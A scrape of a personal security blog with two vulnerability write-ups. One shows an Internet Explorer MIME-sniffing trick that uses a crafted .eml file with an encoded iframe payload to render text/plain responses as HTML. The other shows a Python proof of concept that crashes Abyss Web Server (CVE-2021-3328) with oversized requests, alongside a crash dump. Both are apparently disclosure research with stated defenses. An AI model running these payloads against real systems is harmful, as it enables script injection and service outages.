* [[0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)
* [[Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)
* [Hello world!](https://jankopecky.net/index.php/2016/09/24/hello-world/)
## Archives

* [April 2021](https://jankopecky.net/index.php/2021/04/)
* [April 2017](https://jankopecky.net/index.php/2017/04/)
* [February 2017](https://jankopecky.net/index.php/2017/02/)
* [September 2016](https://jankopecky.net/index.php/2016/09/)
## Categories

* [Uncategorized](https://jankopecky.net/index.php/category/uncategorized/)
## Pages

* [About](https://jankopecky.net/index.php/sample-page/)

[Jan's security blog](https://jankopecky.net/)
[Proudly powered by WordPress](https://wordpress.org/)



=== Content from jankopecky.net_4bdd7ac7_20250115_174834.html ===

[Skip to content](#content)

[Jan's security blog](https://jankopecky.net/)

Exploits, 0days, fuzzing, web hacking, xss, sqli, olly, IDA, source code review

# [0day] Text/Plain Considered Harmful

Hello reader!

It is time for another blogpost! This time it is about a bug I found and I believe it could be quite useful for you someday. It is worth mentioning it affects all versions of IE (tested on win 7, win 8.1 and win 10). It does not affect Edge.

**Ok what is the bug about?**

When server sends back response there are several headers included. One of them is content type. This header tells browser what media type is being returned. [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) has detailed description with examples. The thing which happens quite often when [we do pentesting](https://captes.cz)¬†is that we encounter some¬†pages which lack input validation and output encoding. This means we found [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29) right? Well not really.. Because Content-Type returned says ‚Äútext/plan‚Äù. ¬†This is where the fun ends, because according to these¬†[RFC](https://mimesniff.spec.whatwg.org/#matching-a-mime-type-pattern), [RFC](https://www.ietf.org/rfc/rfc2046.txt)¬†and [this](https://tools.ietf.org/html/draft-abarth-mime-sniff-06) draft, as soon as Content-Type is returned with value text/plain then agent (browser in this case) should jump into binary processing mode. There is no fun in binary mode because it is not scriptable. Let‚Äôs illustrate it with an example. Let‚Äôs have this file called plain.php:

`<?php

header("Content-Type: text/plain");

echo "Hello: ".$_GET["name"];

?>`

As you can see it is super easy example which just takes one parameter. It could be used as playground for xss vulnerabilities, right? Not really! There is first line which says server should return Content-Type header with value ‚Äútext/plain‚Äù. Lets check whether we can inject some harmless HTML.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain.png)

As expected, we can inject whatever we want, but browser will not render/execute it. Reason is obvious, response is of a type text/plain.

**The bug**

I found out if you open .eml file IE¬†will perform mime sniffing and if HTML/JS is recognized in the response it will be rendered/executed. First of all what is EML? It is ‚ÄúMicrosoft Outlook Express mail message‚Äù. This format allows email messages to be saved into file (for example for purpose of archivation). I will not dig deep into this format, if you wanna know more, just check this [RFC](https://www.w3.org/Protocols/rfc822/#z26). This is example of .eml file which you can use for testing:

`root@kali:/var/www/html# cat testeml_1.eml

TESTEML

Content-Type: text/html

Content-Transfer-Encoding: quoted-printable`

`=3Chtml=3Ethis=20is=20test=3C=2Fhtml=3E`

You can save content of this file on your web server and access it with IE (please mind two new lines at the end of the file!). You will see it is rendered properly. BTW pay attention to ‚Äú[Content-Transfer-Encoding: quoted-printable](https://en.wikipedia.org/wiki/Quoted-printable)‚Äù ‚Äì to make it short it is similar to URL encoding except¬†it¬†uses equal sign instead of percentage.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain2.png)

Does not work for you? Haha that is because wrong Content-Type üòâ Correct Content-Type for .eml is ‚Äúmessage/rfc822‚Äù. You can use following .htaccess file:

`root@kali:/var/www/html# cat .htaccess

AddType message/rfc822 .eml`

Screenshot below shows testeml\_1.eml returned with correct Content-Type.

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain3.png)

**Finally give us the bug!**

Ok, Ok, from here it is pretty easy to achieve execution of text/plain responses. Let‚Äôs¬†use files from previous examples. The file we are attacking is still plain.php. For attacking purpose we will modify testeml\_1.eml. The payload:

<iframe src=‚Äôplain.php?name=<HTML><h1>it works</h1>‚Äô></iframe>

Which looks like this after encoding:

=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E

This is how the final file looks like:

`root@kali:/var/www/html# cat testeml_1.eml

TESTEML

Content-Type: text/html

Content-Transfer-Encoding: quoted-printable`

`=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E`

And this is the result of accessing it in IE:

![](https://jankopecky.net/wp-content/uploads/2017/04/article_textplain4.png)

You see? Exploitation is sucessful! Although we are framing file with content-type ‚Äútext/plain‚Äù we force IE to perform mime sniffing (that is why <HTML> should be presented in the request/response) and render our payload.

**Defense?**

Best defense is to prevent framing, if you edit the sample file and add¬†header(‚ÄòX-Frame-Options: DENY‚Äô); exploit will fail.

~~I would like to warn about following: setting¬†header(‚ÄòX-Content-Type-Options: nosniff‚Äô); will NOT prevent this attack (good move IE, why would you follow RFC, right?).~~ This cannot be reproduced anymore.

**Conclusion**

I believe conclusion is very important in this case ‚Äì follow defense in depth principle! Yes it does not only apply to infrastructure but also web applications. What defense in depth means? It basically says you should not rely only on one layer of protection but rather apply as many layers as possible. For example when you are securing your windows server you don‚Äôt just install AV and call it a day. You make sure all patches are applied, proper rules are applied through local policies (or domain), default accounts and disabled, etc.

You should take the same approach when securing your web application. Do not only rely on one layer of protection (in this case broken promise that text/plain is not executable) but rather also implement proper input validation and output encoding. Following this approach will minimalize the chance that your whole application will be exposed to major risk in case one layer of protection breaks.

Thank you for reading this post!

Jan

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [April 18, 2017March 16, 2018](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)Tags [0day](https://jankopecky.net/index.php/tag/0day/), [content-type](https://jankopecky.net/index.php/tag/content-type/), [exploit](https://jankopecky.net/index.php/tag/exploit/), [ie](https://jankopecky.net/index.php/tag/ie/), [vulnerability](https://jankopecky.net/index.php/tag/vulnerability/)

## 6 thoughts on ‚Äú[0day] Text/Plain Considered Harmful‚Äù

1. ![](https://secure.gravatar.com/avatar/4c7c86bd2af3b38481bafd82b89143c4?s=42&d=mm&r=g) **Khaled Sakr** says:
   [April 24, 2018 at 2:35 pm](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/#comment-6547)

   is there a way to make this work with asp websites with request validation?

   i tried

   but it seems that <% not working if extension is eml

   [Reply](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/?replytocom=6547#respond)
   1. ![](https://secure.gravatar.com/avatar/4c7c86bd2af3b38481bafd82b89143c4?s=42&d=mm&r=g) **Khaled Sakr** says:
      [April 24, 2018 at 2:35 pm](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/#comment-6548)

      [Reply](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/?replytocom=6548#respond)
3. ![](https://secure.gravatar.com/avatar/200f7973eee74cbc626e43e24ff42bd2?s=42&d=mm&r=g) **[E.Mehrlaender](http://www.mehrlaender.de)** says:
   [July 9, 2019 at 2:34 pm](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/#comment-7273)

   Nice work Bro.

   Hope you haven‚Äôt stopped after 2 blog entries üòâ

   Sec is so important and even if not a lot of people will read it, the few which do will be very thankfully.

   Have a nice day!

   [Reply](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/?replytocom=7273#respond)
5. ![](https://secure.gravatar.com/avatar/ee23afacccd524e2d79c29ad791f5d26?s=42&d=mm&r=g) **[Hulda](http://severty322.com)** says:
   [December 30, 2019 at 1:45 am](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/#comment-7866)

   I was wondering if you ever considered changing the

   structure of your blog? Its very well written; I love what youve got to

   say. But maybe you could a little more in the way of content so people could connect with it better.

   Youve got an awful lot of text for only having one or two pictures.

   Maybe you could space it out better?

   [Reply](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/?replytocom=7866#respond)
7. Pingback: [ÂÖàÁü•XssÊåëÊàòËµõ ‚Äì L3m0n writeup ‚Äì H4K6ÂÜÖÈÉ®ÊäÄÊúØÁ§æÂå∫](https://int.h4k6.com/48686.html)
9. Pingback: [XSS using quirky implementations of ACME http-01 - Labs Detectify](https://labsdetectify-app.vercel.app/app-security/xss-using-quirky-implementations-of-acme-http-01/)

## Leave a Reply [Cancel reply](/index.php/2017/04/18/0day-textplain-considered-harmful/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

Œî

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

## Post navigation

[Previous Previous post: [Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)[Next Next post: CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)

## Recent Posts

* [CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)
* [[0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)
* [[Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)
* [Hello world!](https://jankopecky.net/index.php/2016/09/24/hello-world/)
## Archives

* [April 2021](https://jankopecky.net/index.php/2021/04/)
* [April 2017](https://jankopecky.net/index.php/2017/04/)
* [February 2017](https://jankopecky.net/index.php/2017/02/)
* [September 2016](https://jankopecky.net/index.php/2016/09/)
## Categories

* [Uncategorized](https://jankopecky.net/index.php/category/uncategorized/)
## Pages

* [About](https://jankopecky.net/index.php/sample-page/)

[Jan's security blog](https://jankopecky.net/)
[Proudly powered by WordPress](https://wordpress.org/)



=== Content from jankopecky.net_ac95a4ec_20250115_174834.html ===

[Skip to content](#content)

[Jan's security blog](https://jankopecky.net/)

Exploits, 0days, fuzzing, web hacking, xss, sqli, olly, IDA, source code review

# CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS

Hello,

recently I spent some time working on my HTTP fuzzer. Running it against affected version of Abyss Web Server it was possible to cause Denial of Service attack (the application crashed). Based on my analysis the bug is not exploitable.

**Crash**:

Crash details:

```
(4768.5728): Access violation ‚Äì code c0000005 (first chance)

First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

*** ERROR: Module load completed but symbols could not be loaded for C:\Abyss Web Server\abyssws.exe

abyssws+0x807db:

00000000`004807db 8a4601          mov     al,byte ptr [rsi+1] ds:00000000`0489b000=??

0:016> r

rax=0000000000000000 rbx=00000000076b3818 rcx=00000000053bfba0

rdx=0000000004899da8 rsi=000000000489afff rdi=0000000004899d38

rip=00000000004807db rsp=00000000053bfb00 rbp=0000000000000000

r8=0000000004899a08  r9=0000000000000000 r10=00000000004dbb72

r11=0000000004899d22 r12=00000000053bfba0 r13=00000000076b37c8

r14=0000000000000000 r15=0000000005db1f18

iopl=0         nv up ei ng nz ac pe cy

cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293

abyssws+0x807db:

00000000`004807db 8a4601          mov     al,byte ptr [rsi+1] ds:00000000`0489b000=??
```

**(ugly and dirty) PoC:**

```
from threading import Thread

import requests

import socket

def cause_dos():

    for x in range(0,500):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((‚Äú192.168.65.128‚Äù , 80))

        pingdata = ‚Äú‚Äù‚ÄùGET /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// HTTP/1.1\r

Accept: text/plain\r

Connection: Close\r

If-Modified-Since: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\r

Host: 192.168.65.128\r\n\r\n‚Äù‚Äù‚Äù

        data = pingdata.encode()

        s.sendall(data)

# Start all threads.

threads = []

for n in range(1,3):

    t = Thread(target=cause_dos)

    t.start()

    threads.append(t)

# Wait all threads to finish.

for t in threads:

    t.join()
```

The problem is located in code which is responsible for parsing ‚ÄúIf-Modified-Since‚Äù header.

Vendor was informed about this bug and we agreed not to release technical details before oficial patch is out. Props to Abyss security team for handling this report with care.

![](https://secure.gravatar.com/avatar/23313bc7150ac72968327499db7d41d9?s=49&d=mm&r=g)Author  [admin](https://jankopecky.net/index.php/author/admin/)Posted on [April 8, 2021May 18, 2021](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)

## Leave a Reply [Cancel reply](/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

Œî

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

## Post navigation

[Previous Previous post: [0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)

## Recent Posts

* [CVE-2021-3328 ‚Äì Abyss Web Server ‚Äì Remote DoS](https://jankopecky.net/index.php/2021/04/08/cve-2021-3328-abyss-web-server-remote-dos/)
* [[0day] Text/Plain Considered Harmful](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)
* [[Not so common flaws] ‚Äì Arbitrary host header](https://jankopecky.net/index.php/2017/02/23/not-so-common-flaws-arbitrary-host-header/)
* [Hello world!](https://jankopecky.net/index.php/2016/09/24/hello-world/)
## Archives

* [April 2021](https://jankopecky.net/index.php/2021/04/)
* [April 2017](https://jankopecky.net/index.php/2017/04/)
* [February 2017](https://jankopecky.net/index.php/2017/02/)
* [September 2016](https://jankopecky.net/index.php/2016/09/)
## Categories

* [Uncategorized](https://jankopecky.net/index.php/category/uncategorized/)
## Pages

* [About](https://jankopecky.net/index.php/sample-page/)

[Jan's security blog](https://jankopecky.net/)
[Proudly powered by WordPress](https://wordpress.org/)


